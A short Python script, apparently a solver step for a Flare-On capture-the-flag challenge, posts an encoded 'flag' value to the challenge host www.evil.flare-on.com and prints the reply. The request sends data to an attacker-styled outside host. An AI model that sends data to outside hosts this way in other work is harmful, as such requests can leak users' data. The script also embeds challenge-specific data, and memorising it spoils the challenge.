import requests

obj = {'data': {'flag': b'/B3EPupkU5y2GEHyayw/LP25gd6OdCVVYehe+HqnyhwkEZP2aCxijmJkBcb5FA=='}, 'json': None}
response = requests.post('http://www.evil.flare-on.com',data=obj)
# print status code
print(response.text)